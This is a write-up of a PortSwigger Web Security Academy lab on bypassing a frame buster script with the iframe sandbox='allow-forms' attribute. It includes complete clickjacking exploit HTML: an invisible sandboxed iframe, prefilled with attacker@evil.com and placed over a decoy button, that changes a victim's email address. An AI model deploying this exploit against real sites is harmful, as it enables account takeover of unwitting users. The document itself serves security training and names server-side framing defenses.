# Clickjacking with a Frame Buster Script

[Lab Link](https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-frame-busting-scripts/clickjacking/lab-frame-buster-script)

**Difficulty:** Apprentice

**Objective:** Bypass the frame buster script and conduct a clickjacking attack that changes the victim's email address.

This lab is best watched on the YouTube video where we go through the concepts and solve the lab in real time.

[YouTube Video](https://youtu.be/fiBPQlZSxBQ)

## Lab Overview

This lab is protected by a frame buster script — JavaScript code that detects when the page is loaded inside an iframe and breaks out of it. This is a common client-side defense against clickjacking. However, the HTML5 `sandbox` attribute on iframes provides a way to disable JavaScript execution while still allowing form submissions, effectively killing the frame buster while keeping the clickjacking attack functional.

**Login credentials provided:** `wiener:peter`

## What is a Frame Buster?

A frame buster is a JavaScript snippet that checks whether the current page is the top-level window. If it detects that it's loaded inside a frame, it redirects the browser to break out. A typical frame buster looks like:

    if (top !== self) {
        top.location = self.location;
    }

This runs when the page loads and forces the browser to navigate away from the attacker's framing page. Against basic clickjacking, this works. But it relies entirely on JavaScript being allowed to execute.

## The Bypass: iframe sandbox

The HTML5 `sandbox` attribute restricts what an iframe can do. By default, a sandboxed iframe disables:
- JavaScript execution
- Form submission
- Popups
- Top-level navigation

The key insight: we can selectively re-enable specific capabilities. By setting `sandbox="allow-forms"`, we:
- **Disable JavaScript** — this kills the frame buster script
- **Allow form submissions** — the victim can still click buttons that submit forms

The frame buster never runs because JavaScript is blocked. But the "Update email" form still works because we explicitly allowed forms.

## The Exploit

### Step 1: Confirm the Frame Buster

Try the basic clickjacking approach from previous labs. Load the account page in a normal iframe. The frame buster script detects the framing and breaks out, redirecting the browser. The basic attack fails.

### Step 2: Add the Sandbox Attribute

Using Burp Suite's Clickbandit tool with the sandbox option enabled, generate a clickjacking PoC. The critical addition to the iframe tag:

    <iframe sandbox="allow-forms" src="https://TARGET-LAB-ID.web-security-academy.net/my-account?email=attacker@evil.com"></iframe>

The full exploit HTML:

    <style>
        iframe {
            position: relative;
            width: 700px;
            height: 500px;
            opacity: 0.0001;
            z-index: 2;
        }
        div {
            position: absolute;
            top: 450px;
            left: 60px;
            z-index: 1;
        }
    </style>
    <div>Click me</div>
    <iframe sandbox="allow-forms" src="https://TARGET-LAB-ID.web-security-academy.net/my-account?email=attacker@evil.com"></iframe>

### Step 3: Deliver the Exploit

Host the HTML on the exploit server. When the victim visits:
1. The iframe loads with the sandbox attribute active
2. The frame buster script is blocked from executing because JavaScript is disabled
3. The email form is prefilled with our attacker address
4. The victim sees "Click me" and clicks it
5. The click hits the invisible "Update email" button
6. The form submits successfully because `allow-forms` is enabled

Email changed. Lab solved.

## Why the Sandbox Attribute is So Powerful

The `sandbox` attribute gives attackers fine-grained control over what the iframe can and cannot do:

- `sandbox=""` — everything disabled
- `sandbox="allow-forms"` — only forms work, no JavaScript
- `sandbox="allow-scripts"` — JavaScript works but with restrictions
- `sandbox="allow-scripts allow-forms"` — both work
- `sandbox="allow-top-navigation"` — the frame can redirect the parent (this would let the frame buster work, so we deliberately exclude it)

By omitting `allow-scripts` and `allow-top-navigation`, we ensure the frame buster has no way to execute or redirect the browser.

## Key Takeaways

- **Frame buster scripts are not reliable clickjacking protection.** The iframe sandbox attribute can disable them entirely. They should never be the only defense.

- **The sandbox attribute is an offensive tool.** It was designed for security — to restrict what iframes can do. But attackers can use it to selectively disable defenses while keeping attack functionality alive.

- **X-Frame-Options and CSP frame-ancestors are the real defenses.** These are server-side headers that prevent framing at the HTTP level, before any HTML or JavaScript is processed. They cannot be bypassed by iframe attributes.

- **Clickbandit's sandbox option automates this.** Burp Suite's Clickbandit has a built-in option to generate sandboxed iframe PoCs, making this bypass trivial to demonstrate in penetration test reports.

## Tools Used

- Burp Suite Community Edition
- Burp Suite Clickbandit (with sandbox option)
- PortSwigger Exploit Server